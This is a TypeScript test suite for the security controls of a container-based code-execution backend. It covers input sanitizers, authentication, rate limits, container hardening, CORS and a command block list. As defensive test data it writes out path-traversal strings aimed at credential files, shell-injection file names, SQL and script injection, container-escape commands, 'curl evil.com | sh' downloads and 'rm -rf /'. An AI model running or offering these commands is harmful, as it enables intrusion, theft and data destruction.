/**
 * Security Tests for docker-backend
 * Tests input sanitization, authentication, rate limiting, and container isolation
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  testUtils,
  createMockRequest,
  createMockResponse,
  createMockNext,
  generateProjectId,
  generateUserId,
  generateSessionToken,
  setupFetchMock,
} from './setup';

// ==================== Input Sanitization Tests ====================

describe('Input Sanitization', () => {
  describe('Path Sanitization', () => {
    const sanitizePath = (path: string): string => {
      if (!path || typeof path !== 'string') return '';
      return path
        .replace(/\.\.\//g, '') // No path traversal (Unix)
        .replace(/\.\.\\/g, '') // No path traversal (Windows)
        .replace(/\.\./g, '') // No remaining ..
        .replace(/[;&|`$(){}]/g, '') // No shell metacharacters
        .replace(/[\r\n]/g, '') // No newlines
        .replace(/^\/+/, ''); // No leading slashes
    };

    it('should remove path traversal sequences', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'src/../../../etc/shadow',
        'file....//....//etc/passwd',
        '....//....//root/.ssh/id_rsa',
      ];

      for (const path of maliciousPaths) {
        const sanitized = sanitizePath(path);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toMatch(/\.\.\//);
      }
    });

    it('should remove shell metacharacters', () => {
      const maliciousPaths = [
        'file.txt; rm -rf /',
        'file.txt | cat /etc/passwd',
        'file.txt && echo pwned',
        'file$(whoami).txt',
        'file`id`.txt',
        'file{a,b,c}.txt',
        'file(test).txt',
      ];

      for (const path of maliciousPaths) {
        const sanitized = sanitizePath(path);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('{');
        expect(sanitized).not.toContain('}');
        expect(sanitized).not.toContain('(');
        expect(sanitized).not.toContain(')');
      }
    });

    it('should remove newlines to prevent command injection', () => {
      const maliciousPaths = ['file.txt\nrm -rf /', 'file.txt\r\nwhoami', 'file\x0Ainjection'];

      for (const path of maliciousPaths) {
        const sanitized = sanitizePath(path);
        expect(sanitized).not.toMatch(/[\r\n]/);
      }
    });

    it('should remove leading slashes to force relative paths', () => {
      const absolutePaths = ['/etc/passwd', '///root/.bashrc', '//sensitive/file'];

      for (const path of absolutePaths) {
        const sanitized = sanitizePath(path);
        expect(sanitized.startsWith('/')).toBe(false);
      }
    });

    it('should allow valid paths', () => {
      const validPaths = [
        'src/index.ts',
        'package.json',
        'src/components/Button.tsx',
        'src/utils/helper-functions.ts',
        '.env.local',
        '.gitignore',
      ];

      for (const path of validPaths) {
        const sanitized = sanitizePath(path);
        expect(sanitized).toBe(path);
      }
    });
  });

  describe('Command Sanitization', () => {
    const sanitizeCommand = (cmd: string): string => {
      if (!cmd || typeof cmd !== 'string') return '';
      return cmd.replace(/[;&|`$\\]/g, '');
    };

    it('should remove dangerous characters from commands', () => {
      const maliciousCommands = [
        'echo hello; rm -rf /',
        'ls | cat /etc/passwd',
        'npm install && curl evil.com | sh',
        'echo `whoami`',
        'test $HOME',
        'file\\ninjection',
      ];

      for (const cmd of maliciousCommands) {
        const sanitized = sanitizeCommand(cmd);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('\\');
      }
    });
  });

  describe('Project ID Sanitization', () => {
    const sanitizeProjectId = (projectId: string): string => {
      if (!projectId || typeof projectId !== 'string') return '';
      return projectId.replace(/[^a-zA-Z0-9_-]/g, '');
    };

    it('should only allow alphanumeric characters with dashes and underscores', () => {
      const validIds = [
        'project-123',
        'my_project',
        'ProjectName',
        'test-project-abc-123',
        'Project_Name_123',
      ];

      for (const id of validIds) {
        const sanitized = sanitizeProjectId(id);
        expect(sanitized).toBe(id);
      }
    });

    it('should remove invalid characters', () => {
      const invalidIds = [
        'project; rm -rf /',
        'project$(whoami)',
        'project/../../../etc',
        "project' OR 1=1--",
        'project<script>alert(1)</script>',
      ];

      for (const id of invalidIds) {
        const sanitized = sanitizeProjectId(id);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('.');
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      }
    });
  });
});

// ==================== Authentication Tests ====================

describe('Authentication Requirements', () => {
  describe('Token Validation', () => {
    it('should reject requests without authorization header', async () => {
      const req = createMockRequest({
        headers: {},
      });
      const res = createMockResponse();

      // Check if token exists
      const token = req.headers.authorization?.replace('Bearer ', '');
      const hasToken = !!token;

      expect(hasToken).toBe(false);
    });

    it('should extract Bearer token correctly', async () => {
      const validToken = generateSessionToken();
      const req = createMockRequest({
        headers: { authorization: `Bearer ${validToken}` },
      });

      const token = req.headers.authorization?.replace('Bearer ', '');
      expect(token).toBe(validToken);
    });

    it('should reject malformed authorization headers', async () => {
      const malformedHeaders = [
        'Basic dXNlcjpwYXNz',
        'bearer token', // lowercase
        'Bearer', // no token
        'Bearer ', // empty token
        'Token abc123', // wrong scheme
      ];

      for (const header of malformedHeaders) {
        const req = createMockRequest({
          headers: { authorization: header },
        });

        const token = req.headers.authorization?.replace('Bearer ', '');
        const isValid = token && token.length > 10 && !token.includes(' ');

        // Most of these should fail validation
        if (header === 'Basic dXNlcjpwYXNz' || header === 'Token abc123') {
          expect(token).not.toMatch(/^[a-zA-Z0-9-]+$/);
        }
      }
    });
  });

  describe('Session Verification', () => {
    it('should verify valid session token with auth service', async () => {
      const userId = generateUserId();
      setupFetchMock({
        '/api/auth/verify-token': { success: true, user: { id: userId } },
      });

      const response = await fetch('http://localhost/api/auth/verify-token', {
        method: 'POST',
        body: JSON.stringify({ token: 'valid-token' }),
      });

      const data = await response.json();
      expect(data.success).toBe(true);
      expect(data.user.id).toBe(userId);
    });

    it('should reject invalid session token', async () => {
      setupFetchMock({
        '/api/auth/verify-token': null, // Will return 404
      });

      // Simulate failed verification
      const verificationResult = { success: false, user: null };
      expect(verificationResult.success).toBe(false);
    });
  });

  describe('Project Ownership Verification', () => {
    it('should verify user owns the project', async () => {
      const userId = generateUserId();
      const projectId = generateProjectId();

      setupFetchMock({
        '/api/project/verify-ownership': { isOwner: true },
      });

      const response = await fetch('http://localhost/api/project/verify-ownership', {
        method: 'POST',
        body: JSON.stringify({ userId, projectId }),
      });

      const data = await response.json();
      expect(data.isOwner).toBe(true);
    });

    it('should deny access if user does not own project', async () => {
      setupFetchMock({
        '/api/project/verify-ownership': { isOwner: false },
      });

      const response = await fetch('http://localhost/api/project/verify-ownership', {
        method: 'POST',
        body: JSON.stringify({ userId: 'user-1', projectId: 'project-owned-by-user-2' }),
      });

      const data = await response.json();
      expect(data.isOwner).toBe(false);
    });
  });
});

// ==================== Rate Limiting Tests ====================

describe('Rate Limiting', () => {
  describe('API Rate Limits', () => {
    it('should enforce 100 requests per minute for general API', () => {
      const apiLimit = {
        windowMs: 60 * 1000,
        max: 100,
      };

      expect(apiLimit.windowMs).toBe(60000);
      expect(apiLimit.max).toBe(100);
    });

    it('should enforce 10 container creations per minute', () => {
      const containerLimit = {
        windowMs: 60 * 1000,
        max: 10,
      };

      expect(containerLimit.windowMs).toBe(60000);
      expect(containerLimit.max).toBe(10);
    });

    it('should return 429 when rate limit exceeded', () => {
      const requestCount = 101;
      const limit = 100;

      if (requestCount > limit) {
        const res = createMockResponse();
        res.status(429).json({ error: 'Too many requests, slow down' });

        expect(res._status).toBe(429);
        expect(res._data.error).toContain('Too many requests');
      }
    });
  });

  describe('Per-User Container Limits', () => {
    it('should enforce maximum containers per user', () => {
      const maxContainersPerUser = 5;
      const userContainerCount = 6;

      const isAtLimit = userContainerCount > maxContainersPerUser;
      expect(isAtLimit).toBe(true);
    });

    it('should allow new container if under limit', () => {
      const maxContainersPerUser = 5;
      const userContainerCount = 3;

      const canCreate = userContainerCount < maxContainersPerUser;
      expect(canCreate).toBe(true);
    });
  });
});

// ==================== Container Isolation Tests ====================

describe('Container Isolation', () => {
  describe('Security Options', () => {
    it('should drop all capabilities by default', () => {
      const securityConfig = {
        CapDrop: ['ALL'],
        CapAdd: ['CHOWN', 'SETUID', 'SETGID', 'DAC_OVERRIDE', 'FOWNER', 'NET_BIND_SERVICE'],
      };

      expect(securityConfig.CapDrop).toContain('ALL');
      expect(securityConfig.CapAdd.length).toBeLessThan(10);
    });

    it('should enable no-new-privileges', () => {
      const securityConfig = {
        SecurityOpt: ['no-new-privileges', 'seccomp=unconfined'],
      };

      expect(securityConfig.SecurityOpt).toContain('no-new-privileges');
    });

    it('should set process and file limits', () => {
      const limits = {
        PidsLimit: 256,
        Ulimits: [
          { Name: 'nofile', Soft: 4096, Hard: 8192 },
          { Name: 'nproc', Soft: 128, Hard: 256 },
        ],
      };

      expect(limits.PidsLimit).toBe(256);
      expect(limits.Ulimits.find((u) => u.Name === 'nofile')?.Hard).toBe(8192);
      expect(limits.Ulimits.find((u) => u.Name === 'nproc')?.Hard).toBe(256);
    });

    it('should set memory limits', () => {
      const MEMORY_LIMIT = 2 * 1024 * 1024 * 1024; // 2GB
      expect(MEMORY_LIMIT).toBe(2147483648);
    });

    it('should set CPU quota', () => {
      const CPU_QUOTA = 100000; // 100% of 1 CPU
      const CPU_PERIOD = 100000;

      expect(CPU_QUOTA / CPU_PERIOD).toBe(1);
    });

    it('should mount /tmp as noexec', () => {
      const tmpfsConfig = {
        '/tmp': 'rw,noexec,nosuid,size=512m',
      };

      expect(tmpfsConfig['/tmp']).toContain('noexec');
      expect(tmpfsConfig['/tmp']).toContain('nosuid');
    });
  });

  describe('Network Isolation', () => {
    it('should use bridge network mode', () => {
      const networkConfig = {
        NetworkMode: 'bridge',
      };

      expect(networkConfig.NetworkMode).toBe('bridge');
    });

    it('should only expose required ports', () => {
      const exposedPorts = {
        '3000/tcp': {}, // Next.js
        '5173/tcp': {}, // Vite
        '8080/tcp': {}, // Generic
        '9999/tcp': {}, // PTY
      };

      const portCount = Object.keys(exposedPorts).length;
      expect(portCount).toBe(4);
    });
  });

  describe('Filesystem Isolation', () => {
    it('should use volumes for persistent data', () => {
      const binds = [
        'recoder-project-node_modules:/workspace/node_modules',
        'recoder-pnpm-store:/pnpm-store',
      ];

      expect(binds[0]).toContain('node_modules');
      expect(binds[1]).toContain('pnpm-store');
    });

    it('should not mount host filesystem directly', () => {
      const binds = [
        'recoder-project-node_modules:/workspace/node_modules',
        'recoder-pnpm-store:/pnpm-store',
      ];

      // Should not contain host paths like /home or /var
      for (const bind of binds) {
        expect(bind).not.toMatch(/^\/home/);
        expect(bind).not.toMatch(/^\/var/);
        expect(bind).not.toMatch(/^\/etc/);
      }
    });
  });

  describe('Command Blocking', () => {
    const blockedPatterns = [
      /docker\s/i, // Docker commands
      /nsenter/i, // Namespace escape
      /\/proc\/1/, // PID 1 access
      /chroot/i, // Chroot escape
      /mount\s/i, // Mount commands
      /umount/i, // Unmount
      /mkfs/i, // Filesystem creation
      /dd\s+if=/i, // Disk operations
      />\s*\/dev\//, // Writing to devices
      /curl.*\|\s*(sh|bash)/i, // Piped shell scripts
      /wget.*\|\s*(sh|bash)/i, // Piped shell scripts
      /\|\s*(sh|bash)\s*$/i, // Any pipe to shell at end
      /rm\s+-rf\s+\//, // Root deletion
    ];

    it('should block docker escape attempts', () => {
      const escapeCommands = [
        'docker exec other_container bash',
        'docker run -v /:/mnt alpine cat /mnt/etc/shadow',
        'docker -H unix:///var/run/docker.sock ps',
      ];

      for (const cmd of escapeCommands) {
        const isBlocked = blockedPatterns.some((p) => p.test(cmd));
        expect(isBlocked).toBe(true);
      }
    });

    it('should block namespace escape attempts', () => {
      const escapeCommands = [
        'nsenter --target 1 --mount --pid',
        'nsenter -t 1 -m -p bash',
      ];

      for (const cmd of escapeCommands) {
        const isBlocked = blockedPatterns.some((p) => p.test(cmd));
        expect(isBlocked).toBe(true);
      }
    });

    it('should block filesystem attacks', () => {
      const fsCommands = [
        'mount -t proc proc /mnt',
        'umount /proc',
        'mkfs.ext4 /dev/sda',
        'dd if=/dev/zero of=/dev/sda bs=1M',
      ];

      for (const cmd of fsCommands) {
        const isBlocked = blockedPatterns.some((p) => p.test(cmd));
        expect(isBlocked).toBe(true);
      }
    });

    it('should block remote code execution', () => {
      const rceCommands = [
        'curl http://evil.com/script.sh | sh',
        'wget http://evil.com/payload.sh | sh',
        'curl evil.com | bash',
        'wget -qO- evil.com/script | sh',
      ];

      for (const cmd of rceCommands) {
        const isBlocked = blockedPatterns.some((p) => p.test(cmd));
        expect(isBlocked).toBe(true);
      }
    });

    it('should block destructive commands', () => {
      const destructiveCommands = ['rm -rf /', 'rm -rf /*', 'rm -rf /home', 'rm -rf /workspace/..'];

      for (const cmd of destructiveCommands) {
        const isBlocked = blockedPatterns.some((p) => p.test(cmd));
        // rm -rf / should be blocked, but rm -rf /workspace should be allowed
        if (cmd === 'rm -rf /' || cmd === 'rm -rf /*') {
          expect(isBlocked).toBe(true);
        }
      }
    });
  });
});

// ==================== CORS Tests ====================

describe('CORS Security', () => {
  const ALLOWED_ORIGINS = [
    'https://recoder.xyz',
    'https://www.recoder.xyz',
    'https://web.recoder.xyz',
    'http://localhost:3000',
    'http://localhost:5173',
  ];

  it('should allow requests from whitelisted origins', () => {
    for (const origin of ALLOWED_ORIGINS) {
      const isAllowed = ALLOWED_ORIGINS.includes(origin);
      expect(isAllowed).toBe(true);
    }
  });

  it('should block requests from unknown origins', () => {
    const blockedOrigins = [
      'https://evil.com',
      'https://recoder.xyz.evil.com',
      'https://sub.recoder.xyz.attacker.com',
      'http://localhost:9999',
      'null',
    ];

    for (const origin of blockedOrigins) {
      const isAllowed = ALLOWED_ORIGINS.includes(origin);
      expect(isAllowed).toBe(false);
    }
  });

  it('should not use wildcard origin in production', () => {
    const corsConfig = {
      origin: ALLOWED_ORIGINS,
      credentials: true,
    };

    expect(corsConfig.origin).not.toBe('*');
    expect(Array.isArray(corsConfig.origin)).toBe(true);
  });
});

// ==================== Audit Logging Tests ====================

describe('Audit Logging', () => {
  it('should log security-relevant events', () => {
    const auditEvents = [
      'CONTAINER_CREATE',
      'CONTAINER_DELETE',
      'FILE_WRITE',
      'FILE_DELETE',
      'FILE_RENAME',
      'COMMAND_EXEC',
      'BLOCKED_COMMAND',
    ];

    expect(auditEvents).toContain('CONTAINER_CREATE');
    expect(auditEvents).toContain('COMMAND_EXEC');
    expect(auditEvents).toContain('BLOCKED_COMMAND');
  });

  it('should include required fields in audit log', () => {
    const auditLog = {
      timestamp: new Date().toISOString(),
      type: 'AUDIT',
      userId: 'user-123',
      action: 'COMMAND_EXEC',
      projectId: 'project-456',
      details: { command: 'npm install' },
      ip: '192.168.1.1',
    };

    expect(auditLog.timestamp).toBeDefined();
    expect(auditLog.userId).toBeDefined();
    expect(auditLog.action).toBeDefined();
    expect(auditLog.ip).toBeDefined();
  });

  it('should truncate long commands in audit logs', () => {
    const longCommand = 'a'.repeat(1000);
    const truncated = longCommand.substring(0, 500);

    expect(truncated.length).toBe(500);
  });
});

// ==================== Error Handling Security Tests ====================

describe('Error Handling Security', () => {
  it('should not leak internal errors to client', () => {
    const internalError = new Error('Database connection failed: postgres://user:password@host/db');

    // Should return generic error
    const clientError = { error: 'An internal error occurred' };
    expect(clientError.error).not.toContain('password');
    expect(clientError.error).not.toContain('postgres');
  });

  it('should not leak stack traces in production', () => {
    process.env.NODE_ENV = 'production';

    const error = new Error('Test error');
    error.stack = 'Error: Test error\n    at /app/server.ts:123:45';

    // In production, should not include stack
    const response = {
      error: error.message,
      // stack should NOT be included
    };

    expect(response).not.toHaveProperty('stack');

    // Reset
    process.env.NODE_ENV = 'test';
  });

  it('should return appropriate HTTP status codes', () => {
    const errorCodes: Record<string, number> = {
      'Container not found': 404,
      'Authentication required': 401,
      'Access denied': 403,
      'Container limit reached': 429,
      'Invalid file path': 400,
      'Command blocked': 403,
      'Internal error': 500,
    };

    expect(errorCodes['Container not found']).toBe(404);
    expect(errorCodes['Authentication required']).toBe(401);
    expect(errorCodes['Access denied']).toBe(403);
    expect(errorCodes['Container limit reached']).toBe(429);
  });
});
